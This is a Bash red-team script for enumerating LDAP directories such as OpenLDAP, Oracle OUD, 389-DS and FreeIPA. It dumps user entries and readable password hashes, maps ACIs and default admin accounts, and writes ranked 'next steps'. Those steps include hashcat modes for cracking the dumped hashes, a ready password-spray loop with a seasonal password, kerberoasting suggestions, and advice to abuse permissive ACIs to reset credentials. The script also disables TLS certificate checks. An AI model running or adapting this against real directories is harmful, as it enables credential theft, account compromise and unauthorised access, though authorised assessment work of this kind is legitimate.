#!/usr/bin/env bash
# ============================================================================
# ldap-enum.sh  -  Red Team enumeration of NON-AD directory services.
#                  OUD (Oracle Unified Directory) / OID, OpenLDAP, 389-DS,
#                  FreeIPA, and any generic LDAP(S) server.
#                  Same ranked findings model as the rest of the toolkit.
#
# WHAT IT DOES  (read-only)
#   - RootDSE recon: vendor/version fingerprint, naming contexts, supported
#     controls/SASL mechs, whether anonymous bind is allowed.
#   - Vendor-aware checks: OUD/OID, OpenLDAP (ppolicy, readable userPassword),
#     389-DS, FreeIPA (Kerberos principals, HBAC/sudo rules).
#   - Dumps users / groups / and anything with a readable password hash.
#   - Flags: anonymous read, readable {SSHA}/{CRYPT}/userPassword, weak/missing
#     password policy, secrets in description, default-admin DNs to try.
#
# ENGINE   ldapsearch (openldap-clients). Degrades to printing commands if absent.
#
# USAGE
#   ./ldap-enum.sh -H ldap://10.0.0.5                     # anonymous
#   ./ldap-enum.sh -H ldaps://dir.corp:636 -D 'cn=Directory Manager' -w pass
#   ./ldap-enum.sh -H ldap://10.0.0.5 -b 'dc=corp,dc=com' -D 'uid=svc,ou=people,dc=corp,dc=com' -w pass -j
#   ./ldap-enum.sh -H ldap://10.0.0.5 --starttls
# ============================================================================
set -u

URI=""; BINDDN=""; BINDPW=""; BASE=""; OUTBASE="."; JSON=0; STARTTLS=0
while [ $# -gt 0 ]; do
  case "$1" in
    -H|--uri) URI="$2"; shift 2;;
    -D|--binddn) BINDDN="$2"; shift 2;;
    -w|--pass) BINDPW="$2"; shift 2;;
    -b|--base) BASE="$2"; shift 2;;
    --starttls) STARTTLS=1; shift;;
    -o) OUTBASE="$2"; shift 2;;
    -j|--json) JSON=1; shift;;
    -h|--help) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0;;
    *) echo "unknown arg: $1"; exit 1;;
  esac
done
[ -z "$URI" ] && { echo "[-] need -H ldap://host[:port] (or ldaps://)"; exit 1; }

HOSTID=$(echo "$URI" | sed 's#[^a-zA-Z0-9]#_#g'); TS=$(date +%Y%m%d_%H%M%S)
RUN="${OUTBASE%/}/ldapenum_${HOSTID}_${TS}"; mkdir -p "$RUN" 2>/dev/null || { echo "[-] cannot create $RUN"; exit 1; }
if [ -t 1 ]; then R=$'\e[31m';Y=$'\e[33m';C=$'\e[36m';G=$'\e[32m';D=$'\e[90m';N=$'\e[0m'; else R=;Y=;C=;G=;D=;N=; fi
SUMMARY="$RUN/00_SUMMARY.txt"; NEXT="$RUN/NEXT_STEPS.txt"; JFILE="$RUN/findings.json"
: > "$SUMMARY"; : > "$NEXT"; HIGHN=0;MEDN=0;INFON=0
declare -a J_HIGH=() J_MED=() J_INFO=() J_NEXT=()
sect(){ printf '\n%s[==== %s ====]%s\n' "$C" "$1" "$N"; }
flag(){ sev="$1";shift;txt="$*";case "$sev" in
  HIGH)col=$R;tag="[HIGH]";HIGHN=$((HIGHN+1));J_HIGH+=("$txt");;
  MED)col=$Y;tag="[MED ]";MEDN=$((MEDN+1));J_MED+=("$txt");;
  *)col=$D;tag="[INFO]";INFON=$((INFON+1));J_INFO+=("$txt");;esac
  printf '%s%s %s%s\n' "$col" "$tag" "$txt" "$N"; printf '%s %s\n' "$tag" "$txt" >> "$SUMMARY"; }
nextstep(){ printf '[*] %s\n    %s\n\n' "$1" "$2" >> "$NEXT"; J_NEXT+=("$1 :: $2"); }
save(){ cat > "$RUN/$1"; }
has(){ command -v "$1" >/dev/null 2>&1; }

# assemble ldapsearch base args
AUTH="-x"; [ -n "$BINDDN" ] && AUTH="-x -D \"$BINDDN\" -w \"$BINDPW\""
TLS=""; [ "$STARTTLS" = "1" ] && TLS="-ZZ"
# relax cert checks for self-signed directories (common in labs)
export LDAPTLS_REQCERT=never
LS(){ eval "ldapsearch -LLL -o ldif-wrap=no $TLS -H \"$URI\" $AUTH $*" 2>/dev/null; }

echo "${G}[*] ldap-enum  ->  $RUN${N}"
echo "${D}[*] $URI  bind=${BINDDN:-<anonymous>}${N}"

if ! has ldapsearch; then
  flag INFO "ldapsearch not installed - install openldap-clients. Commands below are ready to paste."
  nextstep "RootDSE" "ldapsearch -x -H $URI -s base -b '' + "
  nextstep "Dump users" "ldapsearch -x -H $URI -b '<base>' '(objectClass=person)'"
fi

# ----------------------------- RootDSE -----------------------------
sect "RootDSE (fingerprint, naming contexts, anon bind)"
ROOT=$(LS -s base -b '' '+' '*')
echo "$ROOT" | save 00_rootdse.txt
if [ -n "$ROOT" ]; then
  flag INFO "Anonymous (or supplied) bind returned RootDSE."
  [ -z "$BINDDN" ] && flag MED "Anonymous bind is permitted and returns data -> read the tree without creds."
  VENDOR=$(echo "$ROOT" | grep -i '^vendorName:' | cut -d' ' -f2-)
  VVER=$(echo "$ROOT" | grep -i '^vendorVersion:' | cut -d' ' -f2-)
  NC=$(echo "$ROOT" | grep -i '^namingContexts:' | cut -d' ' -f2-)
  [ -n "$VENDOR" ] && flag INFO "Vendor: $VENDOR ${VVER:+/ $VVER}"
  [ -n "$NC" ] && flag INFO "Naming contexts: $(echo "$NC" | tr '\n' ' ')"
  # pick a base if not supplied
  if [ -z "$BASE" ]; then BASE=$(echo "$NC" | head -1); fi
  echo "$ROOT" | grep -qi 'oracle' && { PROD="OUD/OID (Oracle)"; }
  echo "$ROOT" | grep -qi 'openldap\|OpenLDAProotDSE' && PROD="OpenLDAP"
  echo "$ROOT" | grep -qi '389\|Red Hat\|FreeIPA\|IPA' && PROD="389-DS/FreeIPA"
  echo "$ROOT" | grep -qi 'Microsoft' && PROD="Active Directory (use rt-adenum.sh instead)"
  : "${PROD:=generic LDAP}"
  flag INFO "Detected product: $PROD   (base: ${BASE:-<unknown>})"
else
  flag MED "No RootDSE returned - server may require auth, or anonymous bind is disabled."
fi

[ -z "$BASE" ] && { flag INFO "No base DN known - pass -b '<dc=..>'. Stopping deep enum."; }

# ----------------------------- users / groups -----------------------------
if [ -n "$BASE" ]; then
  sect "Users & groups"
  LS -b "$BASE" '(|(objectClass=person)(objectClass=inetOrgPerson)(objectClass=posixAccount)(objectClass=user))' \
     dn cn uid sn mail uidNumber gidNumber userPassword authPassword krbPrincipalName description loginShell shadowLastChange \
     | save 01_users.txt
  LS -b "$BASE" '(|(objectClass=groupOfNames)(objectClass=groupOfUniqueNames)(objectClass=posixGroup))' \
     dn cn member uniqueMember memberUid gidNumber | save 02_groups.txt
  UCT=$(grep -c '^dn:' "$RUN/01_users.txt" 2>/dev/null)
  GCT=$(grep -c '^dn:' "$RUN/02_groups.txt" 2>/dev/null)
  flag INFO "Users: ${UCT:-0}   Groups: ${GCT:-0}"

  # readable password hashes = jackpot
  if grep -Eqi '^userPassword:|^authPassword:' "$RUN/01_users.txt" 2>/dev/null; then
    HC=$(grep -Eci '^userPassword:|^authPassword:' "$RUN/01_users.txt")
    flag HIGH "Readable password hashes exposed ($HC userPassword/authPassword values) -> crack offline."
    nextstep "Crack directory hashes" "grep -i '^userPassword' 01_users.txt | base64 -d 2>/dev/null; # {SSHA}->hashcat -m 111, {CRYPT}->-m 1800/500, {MD5}->-m 0"
  fi
  # Kerberos principals (FreeIPA)
  grep -qi '^krbPrincipalName:' "$RUN/01_users.txt" 2>/dev/null && { flag INFO "FreeIPA/Kerberos principals present -> AS-REP/kerberoast possible via the KDC."; nextstep "FreeIPA roast" "GetNPUsers.py / kerbrute against the IPA KDC"; }
  # secrets in description / comment
  grep -Ei '^description:|^comment:' "$RUN/01_users.txt" 2>/dev/null | grep -Eiq 'pass|pwd|secret|cred|key' && flag MED "Secret-shaped description/comment on an entry (grep description: in 01_users.txt)."
  # posix login shells -> real accounts to target / spray
  grep -qi '^loginShell: /bin/\(ba\)\?sh\|^loginShell: /bin/zsh' "$RUN/01_users.txt" 2>/dev/null && flag INFO "POSIX accounts with interactive shells present (spray/SSH targets)."
fi

# ----------------------------- password policy -----------------------------
if [ -n "$BASE" ]; then
  sect "Password policy & account lockout"
  # OpenLDAP ppolicy
  LS -b "$BASE" '(objectClass=pwdPolicy)' dn pwdMinLength pwdLockout pwdMaxFailure pwdCheckQuality 2>/dev/null | save 03_pwpolicy.txt
  # OUD / 389 policies live under cn=config (needs admin) - try subschema/known DNs
  LS -b "cn=config" '(objectClass=*)' dn ds-cfg-password-policy 2>/dev/null >> "$RUN/03_pwpolicy.txt"
  if [ -s "$RUN/03_pwpolicy.txt" ]; then
    grep -qi 'pwdLockout: *FALSE' "$RUN/03_pwpolicy.txt" 2>/dev/null && { flag MED "ppolicy pwdLockout=FALSE -> no lockout, password spray is safe."; nextstep "Spray LDAP binds" "for u in \$(grep '^uid:' 01_users.txt|awk '{print \$2}'); do ldapwhoami -x -H $URI -D \"uid=\$u,$BASE\" -w 'Season2026!' 2>/dev/null && echo HIT:\$u; done"; }
    ML=$(grep -i 'pwdMinLength:' "$RUN/03_pwpolicy.txt" | awk '{print $2}' | head -1)
    [ -n "$ML" ] && flag INFO "pwdMinLength: $ML"
  else
    flag INFO "No readable password policy (likely under cn=config requiring admin)."
  fi
fi

# ----------------------------- ACIs / delegated rights -----------------------------
if [ -n "$BASE" ]; then
  sect "Access Control (aci) & delegated rights"
  LS -b "$BASE" '(aci=*)' dn aci 2>/dev/null | save 04_aci.txt
  if [ -s "$RUN/04_aci.txt" ]; then
    flag INFO "ACI attributes are readable (see 04_aci.txt) - map who can write/reset what."
    grep -Eqi 'allow .*userpassword|allow .*write.*\(all\)|ldap:///anyone' "$RUN/04_aci.txt" 2>/dev/null && flag HIGH "Permissive ACI found (write-all / anyone / password rights) -> abuse to reset creds or self-escalate."
  fi
fi

# ----------------------------- default / known admin DNs -----------------------------
sect "Default admin DN hints (try these binds)"
case "${PROD:-}" in
  *Oracle*|*OUD*) flag INFO "OUD default root: 'cn=Directory Manager'. Also check cn=oudadmin / weak ds-cfg bind-password."; nextstep "OUD manager bind" "ldapwhoami -x -H $URI -D 'cn=Directory Manager' -w <pass>";;
  *OpenLDAP*)     flag INFO "OpenLDAP admin usually 'cn=admin,$BASE' or cn=Manager. slapd.conf/olcRootPW may hold the hash on the host.";;
  *389*|*FreeIPA*) flag INFO "389-DS/FreeIPA admin: 'cn=Directory Manager'. FreeIPA 'admin' user in cn=users,cn=accounts,$BASE.";;
esac
nextstep "Anonymous whoami / test" "ldapwhoami -x -H $URI    # confirm bind identity"

# ----------------------------- summary -----------------------------
sect "Writing ranked summary"
{
  echo "ldap-enum summary - $URI - $(date)"
  echo "Product: ${PROD:-?}   Base: ${BASE:-?}   Bind: ${BINDDN:-anonymous}"
  echo
  echo "### HIGH ($HIGHN) ###"; printf '%s\n' "${J_HIGH[@]:-}"
  echo; echo "### MED ($MEDN) ###"; printf '%s\n' "${J_MED[@]:-}"
  echo; echo "### INFO ($INFON) ###"; printf '%s\n' "${J_INFO[@]:-}"
  echo; echo "=== RECOMMENDED NEXT MOVE ==="
  if [ -s "$NEXT" ]; then head -2 "$NEXT" | sed 's/^\[\*\] /-> /'; else echo "-> Supply/guess a bind DN or base; retry authenticated for deeper reads."; fi
} > "$SUMMARY"

if [ "$JSON" = "1" ]; then
  jarr(){ printf '['; first=1; shift; for e in "$@"; do [ $first -eq 1 ]||printf ','; first=0; printf '%s' "$e" | sed 's/\\/\\\\/g;s/"/\\"/g' | awk '{printf "\"%s\"",$0}'; done; printf ']'; }
  { printf '{\n  "uri":"%s","product":"%s","base":"%s","ts":"%s",\n' "$URI" "${PROD:-}" "${BASE:-}" "$TS"
    printf '  "high":'; jarr x "${J_HIGH[@]:-}"; printf ',\n  "med":'; jarr x "${J_MED[@]:-}"; printf ',\n  "info":'; jarr x "${J_INFO[@]:-}"; printf ',\n  "next_steps":'; jarr x "${J_NEXT[@]:-}"; printf '\n}\n'; } > "$JFILE"
fi

echo; echo "${G}[+] Done. HIGH=$HIGHN MED=$MEDN INFO=$INFON${N}"
echo "${G}[+] Read: $SUMMARY  and  $NEXT${N}"
